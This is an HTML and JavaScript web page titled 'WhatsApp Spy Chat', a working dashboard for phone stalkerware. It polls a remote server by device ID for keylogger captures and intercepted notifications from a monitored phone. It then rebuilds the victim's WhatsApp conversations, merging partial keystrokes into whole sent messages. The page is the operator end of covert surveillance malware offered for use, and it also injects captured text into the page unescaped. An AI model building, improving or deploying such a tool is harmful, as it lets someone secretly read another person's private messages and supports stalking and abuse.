<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Spy Chat (Fixed)</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
        
        /* Sidebar */
        .sidebar { width: 30%; max-width: 350px; background: #202c33; border-right: 1px solid #374045; display: flex; flex-direction: column; }
        .sidebar-header { padding: 15px; background: #202c33; border-bottom: 1px solid #374045; display: flex; justify-content: space-between; align-items: center; }
        .contact-list { flex: 1; overflow-y: auto; }
        
        .contact { padding: 12px 15px; border-bottom: 1px solid #2a3942; cursor: pointer; display: flex; align-items: center; transition: background 0.2s; }
        .contact:hover, .contact.active { background: #2a3942; }
        
        .avatar { width: 45px; height: 45px; background: #00a884; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 18px; font-weight: bold; flex-shrink: 0; }
        .contact-info { flex: 1; overflow: hidden; }
        .contact-name { font-size: 16px; font-weight: 500; color: #e9edef; margin-bottom: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .last-msg { font-size: 13px; color: #8696a0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

        /* Chat Area */
        .chat-area { flex: 1; background-color: #0b141a; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); display: flex; flex-direction: column; position: relative; }
        
        .chat-header { padding: 10px 15px; background: #202c33; display: flex; align-items: center; border-bottom: 1px solid #374045; height: 60px; }
        .back-btn { display: none; margin-right: 15px; color: #e9edef; font-size: 20px; cursor: pointer; }
        .chat-title { font-size: 16px; font-weight: 600; }

        .messages { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; }
        
        /* Bubbles */
        .msg { max-width: 65%; padding: 6px 10px; border-radius: 8px; font-size: 14.2px; position: relative; word-wrap: break-word; line-height: 1.4; box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); }
        .msg.incoming { background: #202c33; align-self: flex-start; border-top-left-radius: 0; }
        .msg.outgoing { background: #005c4b; align-self: flex-end; border-top-right-radius: 0; }

        .msg-meta { display: flex; justify-content: flex-end; align-items: center; gap: 4px; margin-top: 2px; }
        .time { font-size: 11px; color: #8696a0; }
        
        /* Mobile */
        @media(max-width: 768px) {
            .sidebar { width: 100%; position: absolute; z-index: 10; height: 100%; }
            .chat-area { width: 100%; position: absolute; z-index: 5; height: 100%; }
            .sidebar.hidden { display: none; }
            .back-btn { display: block; }
        }
    </style>
</head>
<body>

    <div class="sidebar" id="sidebar">
        <div class="sidebar-header">
            <span>Chats <span style="font-size:10px; color:#00a884;">(Live Sync)</span></span>
            <i class="fas fa-trash-alt" onclick="resetData()" style="cursor:pointer; font-size:14px; color:#f15c6d;" title="Clear & Reset"></i>
        </div>
        <div class="contact-list" id="contactList">
            <div style="padding:20px; text-align:center; color:#8696a0;">Connecting...</div>
        </div>
    </div>

    <div class="chat-area">
        <div class="chat-header" id="chatHeader" style="display:none;">
            <i class="fas fa-arrow-left back-btn" onclick="showSidebar()"></i>
            <div class="avatar" id="headerAvatar" style="width:35px; height:35px; font-size:14px; margin-right:10px;"></div>
            <span class="chat-title" id="chatTitle">User</span>
        </div>
        
        <div class="messages" id="msgBox">
            <div style="display:flex; justify-content:center; align-items:center; height:100%; color:#8696a0;">Select a chat</div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('id');
        const STORAGE_KEY = `whatsapp_spy_fixed_v3_${deviceId}`; // New Key to avoid old bad data

        const API_KEYLOGS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/keylogs`;
        const API_NOTIFS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;

        let allChats = {}; 
        let currentChatUser = null;

        // 1. Initial Load
        function loadStorage() {
            const saved = localStorage.getItem(STORAGE_KEY);
            if (saved) {
                try {
                    allChats = JSON.parse(saved);
                    // Cleanup old garbage immediately on load
                    sanitizeData();
                    renderContacts();
                } catch(e) { console.error("Data error", e); }
            }
        }

        // 2. Remove Bad Data (Invalid Date & Loops)
        function sanitizeData() {
            Object.keys(allChats).forEach(user => {
                // Filter out bad dates
                allChats[user] = allChats[user].filter(m => m.time && !isNaN(new Date(m.time).getTime()));
                
                // Remove exact consecutive duplicates
                const uniqueMsgs = [];
                allChats[user].forEach(m => {
                    if (uniqueMsgs.length === 0) {
                        uniqueMsgs.push(m);
                    } else {
                        const last = uniqueMsgs[uniqueMsgs.length - 1];
                        // If same text AND time is very close (within 2 sec) -> It's a loop duplicate -> SKIP
                        if (m.text === last.text && Math.abs(m.time - last.time) < 2000) {
                            return; 
                        }
                        uniqueMsgs.push(m);
                    }
                });
                allChats[user] = uniqueMsgs;
            });
            saveStorage();
        }

        // 3. Fetch Data
        async function syncData() {
            if (!deviceId) return;
            try {
                const [logs, notifs] = await Promise.all([
                    fetch(API_KEYLOGS).then(r => r.json()).catch(()=>[]),
                    fetch(API_NOTIFS).then(r => r.json()).catch(()=>[])
                ]);

                let hasNewData = false;

                // Process Keylogs (Outgoing)
                logs.forEach(item => {
                    if (isValidLog(item)) {
                        const added = processMessage(item.title || "Unknown", item.text, item.timestamp, 'outgoing');
                        if (added) hasNewData = true;
                    }
                });

                // Process Notifications (Incoming)
                // Sort by time first to maintain order
                notifs.sort((a,b) => a.postTime - b.postTime);
                notifs.forEach(item => {
                    if(item.packageName && item.packageName.includes('whatsapp')) {
                        const added = processMessage(item.title, item.text, item.postTime, 'incoming');
                        if(added) hasNewData = true;
                    }
                });

                if (hasNewData) {
                    saveStorage();
                    renderContacts();
                    if(currentChatUser) renderMessages(currentChatUser);
                }
            } catch(e) { console.log(e); }
        }

        function isValidLog(item) {
            // Must have text, must not be strict system logs
            if(!item.text) return false;
            if(item.type === 'outgoing_keylog') return true;
            if(item.appName === 'WhatsApp' && !item.packageName) return true;
            if(item.type === 'incoming_screen') return true;
            return false;
        }

        // 4. SMART ADD LOGIC (The Loop Killer)
        function processMessage(user, text, time, type) {
            if (!user || !text || text.trim() === "") return false;
            
            // Fix Invalid Date Issue:
            let ts = parseInt(time);
            if (!ts || isNaN(new Date(ts).getTime())) return false; // Skip if date is garbage

            if (user.includes("WhatsApp")) return false; // Ignore system notifications

            if (!allChats[user]) allChats[user] = [];
            const history = allChats[user];

            // --- STRICT DUPLICATE CHECK ---
            // Check if this EXACT message exists anywhere in the history with similar time
            // This prevents adding the same API data again and again
            const alreadyExists = history.some(m => 
                m.text === text && Math.abs(m.time - ts) < 5000 // 5 second window overlap
            );
            
            if (alreadyExists) return false; // STOP HERE if it's a duplicate

            // --- KEYLOGGER TYPING CORRECTION ---
            // Example: User types "H", "He", "Hel", "Hello"
            // We only want "Hello".
            const lastMsg = history[history.length - 1];
            if (lastMsg && type === 'outgoing') {
                const timeDiff = Math.abs(ts - lastMsg.time);
                // If new text contains old text and time is close -> Update old message
                if (text.startsWith(lastMsg.text) && timeDiff < 10000) {
                    history.pop(); // Remove "Hel"
                    history.push({ text, time: ts, type }); // Add "Hello"
                    return true;
                }
            }

            // All checks passed? Add it.
            history.push({ text, time: ts, type });
            history.sort((a,b) => a.time - b.time); // Keep sorted
            return true;
        }

        function saveStorage() {
            localStorage.setItem(STORAGE_KEY, JSON.stringify(allChats));
        }

        function resetData() {
            if(confirm("Delete all history and fix loops?")) {
                localStorage.removeItem(STORAGE_KEY);
                location.reload();
            }
        }

        // --- RENDER UI ---
        function renderContacts() {
            const list = document.getElementById('contactList');
            const users = Object.keys(allChats).sort((a,b) => {
                const lastA = allChats[a][allChats[a].length-1]?.time || 0;
                const lastB = allChats[b][allChats[b].length-1]?.time || 0;
                return lastB - lastA;
            });

            if(users.length === 0) {
                list.innerHTML = `<div style="padding:20px;text-align:center;color:#666;">No chats found yet</div>`;
                return;
            }

            list.innerHTML = "";
            users.forEach(user => {
                const last = allChats[user][allChats[user].length - 1];
                const active = currentChatUser === user ? 'active' : '';
                const timeStr = new Date(last.time).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
                
                let preview = last.text;
                if(last.type === 'outgoing') preview = `<i class="fas fa-check"></i> ${preview}`;

                list.innerHTML += `
                    <div class="contact ${active}" onclick="openChat('${user}')">
                        <div class="avatar">${user[0].toUpperCase()}</div>
                        <div class="contact-info">
                            <div class="contact-name" style="display:flex; justify-content:space-between;">
                                ${user} <span style="font-size:11px; color:#8696a0; font-weight:normal;">${timeStr}</span>
                            </div>
                            <div class="last-msg">${preview}</div>
                        </div>
                    </div>
                `;
            });
        }

        function openChat(user) {
            currentChatUser = user;
            document.getElementById('chatTitle').innerText = user;
            document.getElementById('headerAvatar').innerText = user[0].toUpperCase();
            document.getElementById('chatHeader').style.display = 'flex';
            if(window.innerWidth < 768) document.getElementById('sidebar').classList.add('hidden');
            renderMessages(user);
        }

        function renderMessages(user) {
            const box = document.getElementById('msgBox');
            box.innerHTML = "";
            const msgs = allChats[user] || [];
            
            let lastDate = "";

            msgs.forEach(m => {
                // Date Divider
                const d = new Date(m.time);
                const dStr = d.toLocaleDateString();
                if (dStr !== lastDate) {
                    box.innerHTML += `<div style="align-self:center; background:#1f2c34; padding:5px 12px; border-radius:8px; font-size:12px; color:#8696a0; margin:10px 0;">${dStr}</div>`;
                    lastDate = dStr;
                }

                // Msg Bubble
                const tStr = d.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit', hour12:false});
                const div = document.createElement('div');
                div.className = `msg ${m.type}`;
                div.innerHTML = `
                    ${m.text}
                    <div class="msg-meta">
                        <span class="time">${tStr}</span>
                        ${m.type === 'outgoing' ? '<i class="fas fa-check-double" style="color:#53bdeb; font-size:10px;"></i>' : ''}
                    </div>
                `;
                box.appendChild(div);
            });
            box.scrollTop = box.scrollHeight;
        }

        function showSidebar() {
            document.getElementById('sidebar').classList.remove('hidden');
            currentChatUser = null;
        }

        loadStorage();
        syncData();
        setInterval(syncData, 4000);

    </script>
</body>
</html>
